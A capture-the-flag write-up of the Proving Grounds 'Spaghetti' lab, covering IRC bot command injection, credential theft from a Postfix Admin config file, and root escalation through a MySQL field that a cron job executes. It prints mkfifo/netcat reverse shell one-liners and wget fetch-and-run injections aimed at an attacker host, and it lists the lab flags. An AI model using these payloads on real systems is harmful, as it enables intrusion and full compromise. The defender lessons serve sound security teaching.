# Spaghetti(mysql) — Proving Grounds Writeup

**Platform:** Proving Grounds Practice

**OS:** Linux (Ubuntu 20.04)

**Difficulty:** Medium

**Tags:** IRC Bot Exploitation · MySQL Injection · Cron Job Abuse · Privilege Escalation

---

## Table of Contents

1. [Lab Overview](#lab-overview)
2. [Reconnaissance](#reconnaissance)
3. [Enumeration](#enumeration)
4. [Exploitation — IRC Bot Command Injection](#exploitation--irc-bot-command-injection)
5. [Initial Access](#initial-access)
6. [Post-Exploitation — Credential Discovery](#post-exploitation--credential-discovery)
7. [Privilege Escalation — MySQL Cron Job Abuse](#privilege-escalation--mysql-cron-job-abuse)
8. [Flags](#flags)
9. [Attack Chain](#-attack-chain)
10. [Skills Demonstrated](#-skills-demonstrated)
11. [Lessons Learned](#-lessons-learned)
12. [References](#references)

---

## Lab Overview

> *"In this scenario, we'll leverage a vulnerable IRC bot to compromise the target system. We'll then escalate our access by injecting commands into a table on the local MySQL server and exploiting a cron job to execute them."*

**Key Objectives:**
- Enumerate IRC, SMTP, and web services to identify attack surface
- Exploit IRC bot command injection for initial shell access
- Extract database credentials from exposed configuration files
- Escalate privileges by injecting a reverse shell command into a MySQL field executed by a root-level cron job

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -sS -A -T5 -p- -Pn 192.168.166.160
```
<img width="1397" height="801" alt="image" src="https://github.com/user-attachments/assets/e7c479e6-ee2f-427d-9e40-14569bc76766" />

**Ports Discovered:**

| Port | State | Service | Version |
|------|-------|---------|---------|
| 22 | open | SSH | OpenSSH 8.2p1 Ubuntu |
| 25 | open | SMTP | Postfix smtpd |
| 80 | open | HTTP | nginx 1.18.0 |
| 6667 | open | IRC | InspIRCd-3 |
| 8080 | open | HTTP | nginx 1.18.0 (Postfix Admin) |

**Notable Nmap Findings:**
- IRC server: `irc.spaghetti.lan` running InspIRCd-3
- HTTP title on port 8080: **Postfix Admin**
- SMTP commands: `spaghetti.lan, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS`
- SSL cert subject: `commonName=spaghetti.lan`

---

## Enumeration

### Port 80 — Spaghetti Mail Beta

Accessing `http://192.168.166.160` reveals a **Spaghetti Mail (beta)** landing page — a newsletter-style application. The footer references `irc.spaghetti.lan` and the `#mailAssistant` IRC channel, which is a critical hint for enumeration.

<img width="952" height="522" alt="image" src="https://github.com/user-attachments/assets/9b939b2f-cbdf-4ebf-b8f0-46a3f36b0f79" />

<img width="638" height="148" alt="image" src="https://github.com/user-attachments/assets/56f0da0f-cf4b-44be-a692-4e13d690a86b" />

### Port 8080 — Postfix Admin Login

Accessing `http://192.168.166.160:8080/login.php` reveals a **Postfix Admin** mail server administration panel.

<img width="928" height="609" alt="image" src="https://github.com/user-attachments/assets/faea5162-4835-4b01-a8e1-263f7ca015ff" />

Default credentials do not work. We note this as a target for later once credentials are obtained.

### Port 6667 — IRC Enumeration

Connecting manually via netcat to enumerate the IRC server:

```bash
nc -nv 192.168.166.160 6667

nick kali
user kali * 0 kali

list
join #mailAssistant
privmsg #mailAssistant hello
privmsg spaghetti_BoT !command
privmsg spaghetti_BoT !about

python3 -m http.server 80
privmsg spaghetti_BoT email:kali@kali.lan description:test |wget 192.168.45.174/exploit.sh
privmsg spaghetti_BoT email:kali@kali.lan description:test |bash exploit.sh


cat exploit.sh 
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.174 80 >/tmp/f
```
<img width="1670" height="358" alt="image" src="https://github.com/user-attachments/assets/98fc1d1e-745c-4e98-94b2-d8a386919e67" />

<img width="1329" height="360" alt="image" src="https://github.com/user-attachments/assets/13b1f20e-7794-43d4-b807-6c2c10b1fe5c" />

<img width="693" height="69" alt="image" src="https://github.com/user-attachments/assets/3137b2b7-8357-4ced-b9ac-bc104af4e30e" />


**Key Findings:**

- IRC channel: `#mailAssistant`
- Active bot: `spaghetti_BoT`
- Bot responds to: `!command`, `!about`
- Bot accepts email submissions with: `email:<address> description:<text>`
- Bot message: *"Please use `!about` for information"*
- The bot processes user input and passes it to system commands — **potential command injection vector**

---

## Exploitation — IRC Bot Command Injection

### Vulnerability Analysis

The IRC bot's email submission function processes user-supplied input without sanitization. The `description` field is passed directly to a shell command, making it vulnerable to **pipe-based command injection** using the `|` character.

### Step 1 — Craft the Reverse Shell Payload

Create `exploit.sh` on the attacker machine:

```bash
cat exploit.sh
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.174 80 >/tmp/f
```

Host the file via Python HTTP server:

```bash
python3 -m http.server 80
```
### Step 2 — Deliver Payload via IRC Bot Injection

```bash
# Step 1: Download exploit to target via IRC bot injection
privmsg spaghetti_BoT email:kali@kali.lan description:test |wget 192.168.45.174/exploit.sh

# Step 2: Execute the downloaded shell script
privmsg spaghetti_BoT email:kali@kali.lan description:test |bash exploit.sh
```

<img width="992" height="499" alt="image" src="https://github.com/user-attachments/assets/0ab15668-5d79-4fae-b8c7-e97e2afd373d" />

## Initial Access

### Step 3 — Catch the Reverse Shell

Set up netcat listener:

```bash
nc -lvnp 80
```
```
listening on [any] 80 ...
connect to [192.168.45.174] from (UNKNOWN) [192.168.166.160] 44336
bash: cannot set terminal process group (1987): Inappropriate ioctl for device
bash: no job control in this shell
hostmaster@spaghetti:~$
```
**Shell received as:** `hostmaster@spaghetti`

### Stabilize the Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Post-Exploitation — Credential Discovery

### Retrieve local.txt

```bash
cd /home
ls
cd hostmaster
ls
cat local.txt
```

**local.txt:** `048100fdc797378cd376726af69883c3`

<img width="844" height="407" alt="image" src="https://github.com/user-attachments/assets/3c161298-d8e8-477c-a3d7-ae7c02ff2ee4" />

### Enumerate Postfix Admin Configuration

Navigating to the Postfix Admin web root reveals sensitive configuration:

```bash
cd /var/www/postfixadmin
ls
cat config.local.php
```
<img width="792" height="768" alt="image" src="https://github.com/user-attachments/assets/eab89fa1-f8de-4e48-b3b1-10e9323d5f4e" />

<img width="875" height="405" alt="image" src="https://github.com/user-attachments/assets/3f94a3b1-a745-49f9-bfe7-932bde4baa12" />

**config.local.php contents:**

```php
<?php
$CONF['configured'] = true;
$CONF['password_expiration'] = 'YES';
$CONF['database_type'] = 'mysqli';
$CONF['database_host'] = 'localhost';
$CONF['database_user'] = 'postfixadmin';
$CONF['database_password'] = 'P4s8vV0r6';
$CONF['database_name'] = 'postfixadmin';
```

**Credentials extracted:**

```
user     : postfixadmin
password : P4s8vV0r6
database : postfixadmin
```

---

## Privilege Escalation — MySQL Cron Job Abuse

### Step 1 — Connect to MySQL

```bash
mysql -u postfixadmin -pP4s8vV0r6
```

```sql
mysql> show databases;
mysql> use postfixadmin;
mysql> show tables;
mysql> describe mailbox;
mysql> select username, password_expiry from mailbox;
```
<img width="1115" height="427" alt="image" src="https://github.com/user-attachments/assets/fb5cf7f9-9367-4eb8-8cd1-ad5e9b1d28c0" />

<img width="378" height="456" alt="image" src="https://github.com/user-attachments/assets/08d4c8c3-b238-44bb-9b28-782acdb48eda" />

<img width="960" height="513" alt="image" src="https://github.com/user-attachments/assets/682f7748-ef86-44da-ac42-29060def4559" />

**Query Result:**

| username | password_expiry |
|----------|----------------|
| giuseppe.verdi@private.lan | 2022-03-09 11:38:00 |

### Vulnerability Analysis

The `password_expiry` field is processed by a **root-level cron job** that sends password expiry notification emails. The cron script includes the username field in a shell command without sanitization — injecting a shell command via the `username` field will execute as root when the cron job runs.

### Step 2 — Create Root Shell Payload

Create `script.sh` on attacker machine:

```bash
cat script.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.174 4444 >/tmp/f
```

Host it:

```bash
python3 -m http.server 8080
```
### Step 3 — Upload Script to Target

From the hostmaster shell:

```bash
cd /tmp
wget 192.168.45.174:8080/script.sh
chmod +x script.sh
```
<img width="916" height="497" alt="image" src="https://github.com/user-attachments/assets/4897a21a-fa1c-4318-aca5-160b564cbbc5" />

### Step 4 — Inject Command into MySQL & Trigger Cron

```bash
mysql -u postfixadmin -pP4s8vV0r6
```

```sql
mysql> use postfixadmin;

-- Inject reverse shell command into username field
mysql> update mailbox set username=' |/tmp/script.sh';

-- Update password_expiry to trigger cron job execution
mysql> update mailbox set password_expiry = (select now() + interval 7 day);
```
<img width="1008" height="242" alt="image" src="https://github.com/user-attachments/assets/0d32ca65-cb46-4738-a667-9f94f5d30cad" />

### Step 5 — Catch Root Shell

Set up listener on port 4444:

```bash
nc -nvlp 4444
```

Wait for the cron job to execute...

<img width="1173" height="337" alt="image" src="https://github.com/user-attachments/assets/e9287e1a-0627-4038-a25d-0b930198a388" />

```
listening on [any] 4444 ...
connect to [192.168.45.174] from (UNKNOWN) [192.168.166.160] 45958
/bin/sh: 0: can't access tty; job control turned off
# whoami && uname -a && id
Linux spaghetti.lan 5.4.0-66-generic #74-Ubuntu SMP ...
uid=0(root) gid=0(root) groups=0(root)
#
```

**Root access confirmed!**

---

## Flags

### local.txt

```bash
hostmaster@spaghetti:~$ cat local.txt
048100fdc797378cd376726af69883c3
```

### proof.txt

```bash
# cat proof.txt
87a11d2395080ae5d000f33cb58edebc
```
## 🗺️ Attack Chain

```
Target: 192.168.166.160
│
├── [Reconnaissance] nmap -sS -sV -sC -A -T5 -p- -Pn
│       ├── Port 22:   SSH (OpenSSH 8.2p1)
│       ├── Port 25:   SMTP (Postfix smtpd)
│       ├── Port 80:   HTTP nginx — Spaghetti Mail beta
│       ├── Port 6667: IRC (InspIRCd-3, irc.spaghetti.lan)
│       └── Port 8080: HTTP nginx — Postfix Admin panel
│
├── [Enumeration] Multi-Service Enumeration
│       ├── Port 80:   Spaghetti Mail beta → hints at IRC #mailAssistant
│       ├── Port 8080: Postfix Admin login → no default creds, noted for later
│       └── Port 6667: IRC → discovered spaghetti_BoT in #mailAssistant
│               └── Bot accepts: email:<addr> description:<text>
│
├── [Exploit] IRC Bot Command Injection
│       ├── Crafted reverse shell → exploit.sh
│       ├── Hosted via: python3 -m http.server 80
│       ├── Injected: description:test |wget 192.168.45.174/exploit.sh
│       └── Triggered: description:test |bash exploit.sh
│               └── Reverse shell → nc -lvnp 80
│
├── [Initial Access] Shell as hostmaster@spaghetti
│       ├── PTY upgrade: python3 -c 'import pty; pty.spawn("/bin/bash")'
│       ├── Enumerated /var/www/postfixadmin/
│       ├── Found config.local.php → MySQL creds: postfixadmin:P4s8vV0r6
│       └── local.txt: 048100fdc797378cd376726af69883c3
│
├── [Post-Exploitation] MySQL Database Enumeration
│       ├── mysql -u postfixadmin -pP4s8vV0r6
│       ├── use postfixadmin → describe mailbox
│       ├── Found: giuseppe.verdi@private.lan (password_expiry field)
│       └── Identified root-level cron job processing username field
│
└── [Privilege Escalation] MySQL Cron Job Command Injection
        ├── Created script.sh → mkfifo reverse shell payload
        ├── Uploaded to /tmp/script.sh via wget
        ├── Injected: UPDATE mailbox SET username=' |/tmp/script.sh'
        ├── Triggered: UPDATE mailbox SET password_expiry = (now() + 7 days)
        ├── Cron job executed username as shell command with root privileges
        └── Root shell on port 4444
                └── proof.txt: 87a11d2395080ae5d000f33cb58edebc ✅
```

---

## 🛡️ Skills Demonstrated

| Skill | Application | MITRE ATT&CK |
|-------|-------------|--------------|
| **Network Reconnaissance** | Full port scan identifying IRC, SMTP, HTTP, and SSH services | T1046 — Network Service Scanning |
| **Multi-Service Enumeration** | Manual IRC protocol interaction, web app analysis | T1590 — Gather Victim Network Information |
| **IRC Bot Command Injection** | Exploited unsanitized input in IRC bot email handler | T1059.004 — Unix Shell Execution |
| **Reverse Shell Delivery** | Delivered payload via Python HTTP server + wget | T1105 — Ingress Tool Transfer |
| **Configuration File Analysis** | Located and extracted MySQL credentials from `config.local.php` | T1552.001 — Credentials in Files |
| **Database Enumeration** | Queried MySQL, mapped mailbox table schema | T1213 — Data from Information Repositories |
| **Cron Job Abuse (Privesc)** | Injected shell command into DB field executed by root cron job | T1053.003 — Scheduled Task/Job: Cron |
| **SQL-Based Command Injection** | Modified database records to plant reverse shell path in username | T1190 — Exploit Public-Facing Application |
| **Post-Exploitation Techniques** | PTY stabilization, file transfer, credential reuse | T1078 — Valid Accounts |
| **Scripting (Bash)** | Wrote and deployed custom mkfifo reverse shell scripts | T1059.004 — Unix Shell |
| **Penetration Testing Methodology** | Full attack chain: recon → enumeration → exploit → root | — |

---

## 📚 Lessons Learned

### 🔴 For Attackers (Pentesters)

- **IRC is an often-overlooked attack surface.** Always connect manually and enumerate bots — they frequently process user input without sanitization and can be abused for command injection.
- **Follow the hints in web applications.** The Spaghetti Mail page referenced `#mailAssistant` in its footer, directly pointing to the vulnerable IRC channel. Read every page source and footer carefully.
- **Configuration files in web roots are critical finds.** `config.local.php` containing MySQL credentials was accessible from within the hostmaster shell — always enumerate web directories after initial access.
- **Cron jobs + database writes = privilege escalation gold.** When a root-level cron job reads from a database field and executes it as a shell command, updating that field is a reliable privesc technique.
- **Multi-stage payloads work reliably.** Downloading and executing a separately hosted script (rather than injecting the full reverse shell inline) bypasses character limits and encoding issues.
- **Always check `password_expiry` or scheduled processing fields in databases.** These fields often interact with cron scripts that run as root or a higher-privilege user.
- **Pipe injection (`|`) in bot commands is a classic vector.** When a bot processes structured input (e.g. `email:x description:y`), test pipe characters, semicolons, and backticks in every field.

### 🔵 For Defenders

- **Sanitize all user input in IRC bots.** Strip shell metacharacters (`|`, `;`, `&&`, `` ` ``, `$()`) from any field before passing to system commands. Use strict allowlists for expected values.
- **Never use user-supplied data in shell commands.** Use language-native libraries (Python's `smtplib`, PHP's `mail()`) instead of constructing shell commands that include external input.
- **Store configuration files outside the web root.** `config.local.php` should be stored in a non-web-accessible directory with restricted file permissions (e.g. `chmod 640`).
- **Apply least privilege to database users.** The `postfixadmin` database user had unnecessary write access that enabled the privilege escalation. Create separate read-only users for application queries.
- **Audit cron jobs for unsafe patterns.** Any cron script that reads from a database and executes field values as shell commands is a critical security risk. Use prepared statements and validate data before execution.
- **Implement proper IRC bot access controls.** Restrict bot commands to authenticated users, validate all input fields, and log all bot interactions for anomaly detection.
- **Monitor database write activity.** Unexpected `UPDATE` statements — especially modifying fields like `username` or `password_expiry` — should trigger alerts in a SIEM or database activity monitor.
- **Use the principle of least privilege for scheduled tasks.** Cron jobs should run as the minimum required user, not as root. If root access is needed, use `sudo` with specific command allowlisting.
- **Segment IRC services from production systems.** An IRC bot with access to internal services and a database is an unnecessarily wide attack surface. Isolate internal bots with strict firewall rules.

### 🟡 Key Vulnerabilities Summary

| Vulnerability | Root Cause | Severity | Impact | Mitigation |
|---------------|-----------|----------|--------|-----------|
| **IRC Bot Command Injection** | Unsanitized user input passed to shell | Critical | Remote Code Execution | Sanitize all input; avoid shell execution |
| **Exposed Config File** | config.local.php in accessible directory | High | MySQL credential disclosure | Move outside web root; restrict permissions |
| **MySQL Cron Job Abuse** | DB field value executed by root cron | Critical | Full Privilege Escalation | Validate DB data before execution; drop root cron |
| **No Input Validation on Bot** | No allowlist or type checking | High | Command Injection | Implement strict input validation |
| **Excessive DB User Privileges** | Write access enabled injection attack | Medium | Lateral movement / privesc | Apply principle of least privilege |

---

## References

- [InspIRCd Documentation](https://docs.inspircd.org/)
- [Postfix Admin GitHub](https://github.com/postfixadmin/postfixadmin)
- [OWASP — OS Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [MITRE ATT&CK — Scheduled Task/Cron (T1053.003)](https://attack.mitre.org/techniques/T1053/003/)
- [MITRE ATT&CK — Credentials in Files (T1552.001)](https://attack.mitre.org/techniques/T1552/001/)

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Network reconnaissance and port scanning |
| `netcat (nc)` | IRC enumeration and reverse shell listener |
| `python3 -m http.server` | File hosting for payload delivery |
| `wget` | File transfer on target |
| `mysql-client` | Database access and enumeration |
| `python3 pty` | PTY shell stabilization |

---

**Platform:** OffSec Proving Grounds Practice

**Author:** Tanvir Ahmed


